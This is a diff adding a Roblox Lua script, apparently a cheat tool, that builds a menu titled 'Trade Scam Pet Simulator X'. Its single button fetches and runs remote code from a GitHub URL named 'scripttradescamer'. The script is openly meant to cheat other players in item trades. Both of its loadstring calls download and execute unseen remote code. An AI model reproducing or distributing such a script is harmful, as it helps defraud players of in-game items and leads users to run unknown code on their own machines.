@@ -1,0 +1,16 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+
+local Window = Library.CreateLib("Script Trade Scam Pet Simulator X", "Midnight")
+
+--MAIN
+
+local Main = Window:NewTab("Trade Scam")
+
+local MainSection = Main:NewSection("trade Scam")
+
+MainSection:NewButton("click trade scam", "Script BY Scriptpsx", function()
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptDupet/ScriptDupedd/main/scripttradescamer"))()
+
+end)
+
